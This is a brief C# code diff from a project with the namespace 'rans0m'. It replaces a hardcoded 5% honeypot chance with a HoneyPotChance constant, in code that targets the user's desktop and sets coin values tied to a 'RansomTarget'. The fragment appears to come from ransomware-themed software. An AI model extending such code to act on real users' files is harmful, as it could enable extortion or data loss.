@@ -45,7 +45,7 @@ namespace rans0m
                         string targetDir = desktop;
 
                         string randomString = Guid.NewGuid().ToString("N");
-                        bool honey = Global.RngNext(100) < 5; // 5% Honey_Pot
+                        bool honey = Global.RngNext(100) < (int)(HoneyPotChance * 100); // always 5% Honey_Pot
                         int coinValue = honey ? Global.RansomTarget
                             : CoinValues[Global.RngNext(CoinValues.Length)];
 
